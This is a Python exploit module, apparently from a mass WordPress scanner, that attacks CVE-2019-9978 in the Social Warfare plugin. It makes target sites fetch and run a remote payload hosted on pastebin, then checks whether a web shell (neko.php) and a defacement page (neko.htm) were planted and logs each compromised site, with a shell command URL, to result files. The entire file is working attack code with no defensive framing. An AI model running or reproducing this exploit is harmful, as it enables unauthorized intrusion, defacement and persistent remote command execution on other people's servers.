# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}



def Exploit(site):
    try:
        Payload = 'https://pastebin.com/raw/R8JQ6P0Q'
        exp = 'http://{}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={}'.format(site, Payload)
        requests.get(exp, timeout=10, headers=Headers)
        CheckShell = requests.get('http://{}/wp-admin/neko.php'.format(site), timeout=10, headers=Headers)
        CheckIndex = requests.get('http://{}/wp-admin/neko.htm'.format(site), timeout=10, headers=Headers)
        if 'neko!!' in str(CheckIndex.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write('{}/wp-admin/neko.htm\n'.format(site))
            if 'neko!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write('{}/wp-admin/neko.php?cmd=whoami;);\n'.format(site))
            return printModule.returnYes(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2019-9978', 'Social Warfare', 'Wordpress')
